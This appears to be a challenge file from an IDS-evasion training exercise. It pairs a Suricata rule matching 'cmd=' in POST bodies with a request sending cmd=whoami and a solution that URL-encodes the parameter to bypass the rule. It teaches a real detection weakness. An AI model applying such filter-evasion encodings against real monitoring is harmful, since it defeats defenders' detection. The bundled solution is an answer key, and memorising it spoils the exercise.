@@ -1,0 +1,37 @@
+name: 'POST request decoding'
+type: 'exploit'
+
+text: |-
+  POST request with no special encoding are matched using `http.request_body`
+
+  * Goal: Can you keep the same payload but encode to bypass filters?
+
+target: demo
+
+rules:
+# Lots of problems
+- |-
+  alert http any any -> any any ( \
+    msg:"demo"; \
+    http.request_body; content: "cmd="; \
+    sid:123456; \
+    rev:1; \
+  )
+
+base_request: |-
+  POST /detection.php HTTP/1.1
+  Host: example.org
+  Content-Length: 10
+  Content-Type: application/x-www-form-urlencoded
+  
+  cmd=whoami
+
+solution: |-
+  POST /detection.php HTTP/1.1
+  Host: example.org
+  Content-Length: 10
+  Content-Type: application/x-www-form-urlencoded
+  
+  %63md=whoami
+
+expected_output: "cmd=whoami"
